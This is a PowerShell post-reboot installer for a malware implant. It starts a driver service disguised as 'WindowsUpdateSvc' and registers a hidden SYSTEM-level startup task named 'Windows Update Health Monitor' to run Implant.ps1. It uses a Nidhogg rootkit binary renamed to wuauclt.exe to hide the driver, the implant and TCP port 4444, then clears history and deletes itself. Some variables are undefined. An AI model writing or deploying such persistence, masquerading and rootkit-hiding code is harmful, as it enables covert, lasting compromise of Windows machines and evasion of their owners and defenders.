# Install_Implant_PostBoot.ps1 - Post-reboot configuration
$Sys32 = "C:\Windows\System32"
$Package = "C:\Users\Administrator\deathstar_package"

Write-Host "[+] Post-Boot Configuration Running..." -ForegroundColor Cyan

if (-not (Test-Path $ImplantPath)) {
    Write-Host "[-] Implant.ps1 not found at $ImplantPath" -ForegroundColor Red
    Write-Host "Please update the `$PackagePath variable" -ForegroundColor Yellow
    exit
}

# Start Driver
sc.exe start "WindowsUpdateSvc" | Out-Null
Start-Sleep -Seconds 2

# Persistence Task (main implant)
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File $Package\Implant.ps1"

$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "Windows Update Health Monitor" `
    -Action $action -Trigger $trigger -Principal $principal -Force

# Apply Nidhogg protections
if (Test-Path "$Package\wuauclt.exe") {
    $n = "$Package\wuauclt.exe"
    & $n driver hide "$Sys32\drivers\Nidhogg.sys"
    & $n file hide "$Package\Implant.ps1"
    & $n port hide 4444 tcp remote
    Write-Host "[+] Nidhogg protections applied" -ForegroundColor Green
}

# Cleanup

# Remove-Item "C:\*deathstar_package.zip","C:\*deathstar_package","C:\*deathstar_package\*.sys","C:\*deathstar_package\*.ps1","C:\*deathstar_package\*.cer" -Force -EA SilentlyContinue 
# Remove-Item "C:\*death_starpackage" -Force -EA SilentlyContinue
Remove-Item "C:\*deathstar_package.zip","C:\*deathstar_package","C:\*deathstar_package\*.sys","C:\*deathstar_package\*.ps1","C:\*deathstar_package\*.cer" -WhatIf 
Remove-Item "C:\*death_starpackage" -Recurse -WhatIf
Clear-History

Write-Host "`n=== Post-Boot Installation Complete ===" -ForegroundColor Green
Write-Host "Implant is now active with migration + hiding." -ForegroundColor Green

# Self-delete this post-boot script
Remove-Item $MyInvocation.MyCommand.Path -Force -EA SilentlyContinue